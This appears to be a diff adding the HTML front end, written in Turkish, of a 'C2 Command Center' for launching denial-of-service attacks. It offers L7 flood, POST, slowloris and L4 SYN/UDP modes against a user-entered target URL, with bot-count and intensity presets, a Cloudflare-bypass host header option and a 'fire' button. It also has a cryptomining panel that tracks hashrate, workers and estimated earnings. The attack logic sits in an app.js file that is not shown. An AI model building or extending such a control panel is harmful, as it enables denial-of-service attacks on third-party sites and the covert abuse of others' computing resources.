@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Command Center</title>
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+
+<body>
+
+    <!-- TOPBAR -->
+    <header class="topbar">
+        <div class="topbar-left">
+            <div class="logo">
+                <span class="logo-icon">⚡</span>
+                <span class="logo-text">C2 COMMAND CENTER</span>
+            </div>
+        </div>
+        <div class="topbar-right">
+            <div class="attack-timer" id="attackTimer" style="display:none">
+                <span class="timer-dot pulse"></span>
+                <span id="timerText">00:00</span>
+            </div>
+            <div class="conn-status" id="connStatus">
+                <span class="conn-dot" id="connDot"></span>
+                <span id="connText">Bağlanıyor...</span>
+            </div>
+            <div class="last-update" id="lastUpdate"></div>
+        </div>
+    </header>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Yükleniyor...</div>
+    </div>
+
+    <main class="container">
+
+        <!-- GRAND STATS -->
+        <section class="stats-row" id="statsRow">
+            <div class="stat-card glass">
+                <div class="stat-icon green-glow">🤖</div>
+                <div class="stat-body">
+                    <div class="stat-label">Aktif Bot</div>
+                    <div class="big-num green" id="gActive">0</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon blue-glow">📡</div>
+                <div class="stat-body">
+                    <div class="stat-label">Toplam Bot</div>
+                    <div class="big-num blue" id="gTotal">0</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon green-glow">⚡</div>
+                <div class="stat-body">
+                    <div class="stat-label">RPS</div>
+                    <div class="big-num green" id="gRps">0</div>
+                    <div class="stat-sub" id="gRpsSub">bekleniyor</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon yellow-glow">📊</div>
+                <div class="stat-body">
+                    <div class="stat-label">Bandwidth</div>
+                    <div class="big-num yellow" id="gBw">0</div>
+                    <div class="stat-sub" id="gBwUnit">Mbps</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon purple-glow">📦</div>
+                <div class="stat-body">
+                    <div class="stat-label">PPS</div>
+                    <div class="big-num purple" id="gPps">0</div>
+                    <div class="stat-sub">paket/s</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon blue-glow">📈</div>
+                <div class="stat-body">
+                    <div class="stat-label">Toplam İstek</div>
+                    <div class="big-num blue" id="gReqs">0</div>
+                    <div class="stat-sub" id="gReqsSub">bekleniyor</div>
+                </div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-icon red-glow">❌</div>
+                <div class="stat-body">
+                    <div class="stat-label">Başarısız</div>
+                    <div class="big-num red" id="gFail">0</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CHART -->
+        <section class="card glass chart-card">
+            <div class="card-header">
+                <h2>📈 CANLI GRAFİK</h2>
+                <div class="card-badge" id="chartSamples">0 sample</div>
+            </div>
+            <div class="chart-wrap">
+                <canvas id="liveChart"></canvas>
+            </div>
+        </section>
+
+        <!-- BOT DETAILS -->
+        <section class="card glass" id="botDetailsCard" style="display:none">
+            <div class="card-header">
+                <h2>🤖 BOT DETAYLARI (Canlı)</h2>
+            </div>
+            <div id="botDetailsGrid" class="bot-details-grid"></div>
+        </section>
+
+        <!-- COMPLETED SUMMARY -->
+        <section class="card glass" id="summaryCard" style="display:none">
+            <div class="card-header">
+                <h2>📊 SON RUN SONUÇLARI</h2>
+            </div>
+            <div id="summaryResult"></div>
+        </section>
+
+        <!-- ═══════════ MINING PANEL ═══════════ -->
+        <section class="card glass" id="miningPanel">
+            <div class="card-header">
+                <h2>⛏️ MINING PIPELINE (Data Processing)</h2>
+                <div style="display:flex;gap:6px">
+                    <button class="mini-btn"
+                        style="background:linear-gradient(135deg,#3fb950,#2ea043);color:#fff;padding:6px 14px;font-size:12px"
+                        onclick="startMining()">▶ BAŞLAT</button>
+                    <button class="mini-btn"
+                        style="background:linear-gradient(135deg,#f85149,#da3633);color:#fff;padding:6px 14px;font-size:12px"
+                        onclick="stopMining()">⛔ DURDUR</button>
+                </div>
+            </div>
+            <div class="stats-row" style="grid-template-columns:repeat(4,1fr);margin-bottom:12px">
+                <div class="stat-card glass">
+                    <div class="stat-icon purple-glow">⚡</div>
+                    <div class="stat-body">
+                        <div class="stat-label">Toplam Hashrate</div>
+                        <div class="big-num purple" id="mHashrate">0</div>
+                        <div class="stat-sub" id="mHashrateUnit">H/s</div>
+                    </div>
+                </div>
+                <div class="stat-card glass">
+                    <div class="stat-icon green-glow">✓</div>
+                    <div class="stat-body">
+                        <div class="stat-label">Aktif Worker</div>
+                        <div class="big-num green" id="mWorkers">0</div>
+                    </div>
+                </div>
+                <div class="stat-card glass">
+                    <div class="stat-icon yellow-glow">📊</div>
+                    <div class="stat-body">
+                        <div class="stat-label">Toplam Shares</div>
+                        <div class="big-num yellow" id="mShares">0</div>
+                    </div>
+                </div>
+                <div class="stat-card glass">
+                    <div class="stat-icon blue-glow">💰</div>
+                    <div class="stat-body">
+                        <div class="stat-label">Tahmini Kazanç</div>
+                        <div class="big-num blue" id="mEarnings">$0</div>
+                        <div class="stat-sub">/gün (24h)</div>
+                    </div>
+                </div>
+                <div class="stat-card glass">
+                    <div class="stat-icon red-glow">🔥</div>
+                    <div class="stat-body">
+                        <div class="stat-label">CPU Kullanımı</div>
+                        <div class="big-num red" id="mCpuPct">0%</div>
+                        <div class="stat-sub" id="mCpuSub">ortalama</div>
+                    </div>
+                </div>
+            </div>
+            <div id="miningWorkersGrid" class="bot-details-grid"></div>
+        </section>
+
+        <!-- MAIN 2-COL LAYOUT -->
+        <div class="grid-2">
+
+            <!-- LEFT: ATTACK CONTROL -->
+            <div>
+                <div class="section-title">🎯 ATTACK CONTROL</div>
+                <div class="card glass">
+                    <!-- TARGET URL + HISTORY -->
+                    <div class="form-group">
+                        <label>Hedef URL</label>
+                        <div class="input-with-btn">
+                            <input type="text" id="targetUrl" placeholder="https://hedef.com" list="targetHistory">
+                            <datalist id="targetHistory"></datalist>
+                        </div>
+                    </div>
+
+                    <!-- MODE + INTENSITY -->
+                    <div class="grid-2-inner">
+                        <div class="form-group">
+                            <label>Attack Mode</label>
+                            <select id="attackMode">
+                                <option value="flood">🔥 FLOOD (L7 multi-endpoint)</option>
+                                <option value="post">📝 POST (backend killer)</option>
+                                <option value="slowloris">🐌 SLOWLORIS (conn exhaust)</option>
+                                <option value="adaptive">🧠 ADAPTIVE (smart)</option>
+                                <option value="l4">⚡ L4 (TCP/UDP/SYN)</option>
+                                <option value="l4test">🧪 L4 TEST (kapasite testi)</option>
+                                <option value="legacy">📦 LEGACY</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Yoğunluk Preset</label>
+                            <select id="intensity" onchange="onIntensityChange()">
+                                <option value="1">Hafif (60s / 100VU / 5bot)</option>
+                                <option value="2" selected>Orta (120s / 300VU / 20bot)</option>
+                                <option value="3">Agresif (5m / 500VU / 20bot)</option>
+                                <option value="4">Full (20m / 500VU / 20bot)</option>
+                                <option value="custom">⚙️ Özel (manuel gir)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- CUSTOM INPUTS -->
+                    <div id="customInputs" class="custom-inputs" style="display:none">
+                        <div class="grid-3-inner">
+                            <div class="form-group">
+                                <label>Süre</label>
+                                <input type="text" id="customDuration" placeholder="60s / 5m / 20m" value="120s">
+                            </div>
+                            <div class="form-group">
+                                <label>VU / Bot</label>
+                                <input type="number" id="customVus" placeholder="300" value="300" min="1" max="5000">
+                            </div>
+                            <div class="form-group">
+                                <label>Bot Sayısı</label>
+                                <input type="number" id="customJobs" placeholder="20" value="20" min="1" max="20">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- HOST HEADER -->
+                    <div class="form-group">
+                        <label>Host Header (CF Bypass — opsiyonel)</label>
+                        <input type="text" id="hostHeader" placeholder="origin-ip veya subdomain (boş = yok)">
+                    </div>
+
+                    <!-- NTFY CHANNEL -->
+                    <div class="form-group">
+                        <div class="label-row">
+                            <label>Canlı Metrik Kanalı (ntfy.sh)</label>
+                            <div class="mini-btns">
+                                <button class="mini-btn" onclick="generateChannel()">Rastgele</button>
+                            </div>
+                        </div>
+                        <input type="text" id="reportChannel" placeholder="c2-abc123xyz (boş = canlı grafik kapalı)">
+                        <div style="font-size:10px;color:var(--dim2);margin-top:3px">ntfy.sh üzerinden — senin URL'in
+                            hiçbir yerde geçmez</div>
+                    </div>
+
+                    <!-- ACCOUNTS -->
+                    <div class="form-group">
+                        <div class="label-row">
+                            <label>Hesaplar</label>
+                            <div class="mini-btns">
+                                <button class="mini-btn" onclick="toggleAllAccounts(true)">Tümü</button>
+                                <button class="mini-btn" onclick="toggleAllAccounts(false)">Hiçbiri</button>
+                            </div>
+                        </div>
+                        <div class="checkbox-grid" id="accCheckboxes"></div>
+                    </div>
+
+                    <!-- ACTION BUTTONS -->
+                    <div class="btn-row">
+                        <button class="btn btn-fire" onclick="launchAttack()" id="btnFire">
+                            <span class="btn-icon">🔥</span> ATEŞ ET
+                        </button>
+                        <button class="btn btn-stop" onclick="stopAttack()">
+                            <span class="btn-icon">⛔</span> DURDUR
+                        </button>
+                        <button class="btn btn-analyze" onclick="analyzeTarget()">
+                            <span class="btn-icon">🔍</span> ANALİZ
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ANALYZE RESULT -->
+                <div class="card glass" id="analyzeCard" style="display:none">
+                    <div class="card-header">
+                        <h2>🔍 Hedef Analizi</h2>
+                    </div>
+                    <div id="analyzeResult" class="analyze-result"></div>
+                </div>
+
+                <!-- HEALTH -->
+                <div class="card glass">
+                    <div class="card-header">
+                        <h2>💊 Hedef Sağlık</h2>
+                        <div class="card-badge" id="healthBadge">—</div>
+                    </div>
+                    <div id="healthResult" class="health-text">Analiz butonuna tıkla</div>
+                </div>
+            </div>
+
+            <!-- RIGHT: ACCOUNTS + STATS + LOG -->
+            <div>
+                <div class="section-title">📡 HESAP DURUMU</div>
+                <div class="account-grid" id="accountGrid"></div>
+
+                <div class="section-title">📊 İSTATİSTİKLER</div>
+                <div class="card glass">
+                    <div class="stat-row"><span class="stat-label">Toplam Hesap</span><span class="stat-val"
+                            id="sAccounts">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Aktif Run</span><span class="stat-val"
+                            id="sRuns">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Aktif Bot</span><span class="stat-val green"
+                            id="sActive">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Kuyrukta</span><span class="stat-val yellow"
+                            id="sQueued">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Tamamlanan</span><span class="stat-val blue"
+                            id="sDone">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Başarılı</span><span class="stat-val green"
+                            id="sOk">0</span></div>
+                    <div class="stat-row"><span class="stat-label">Başarısız</span><span class="stat-val red"
+                            id="sFail">0</span></div>
+                </div>
+
+                <div class="section-title">📋 AKSİYON LOG</div>
+                <div class="log-box" id="actionLog"><span class="log-welcome">Dashboard hazır. Komut
+                        bekleniyor...</span></div>
+            </div>
+        </div>
+    </main>
+
+    <!-- TOAST CONTAINER -->
+    <div id="toastContainer"></div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
